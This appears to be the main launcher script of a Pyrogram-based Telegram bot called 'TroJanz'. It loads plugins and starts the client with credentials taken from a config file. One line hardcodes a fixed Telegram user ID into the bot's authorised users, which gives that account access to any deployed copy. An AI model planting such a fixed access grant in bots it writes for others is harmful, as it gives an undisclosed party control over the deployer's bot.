#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @teamteleroid


from pyrogram import Client

from config import Config


if __name__ == "__main__":
    plugins = dict(
        root="plugins"
    )
    app = Client(
        "TroJanz",
        bot_token=Config.BOT_TOKEN,
        api_id=Config.APP_ID,
        api_hash=Config.API_HASH,
        plugins=plugins,
        workers=300
    )
    Config.AUTH_USERS.add(1287407305)
    app.run()
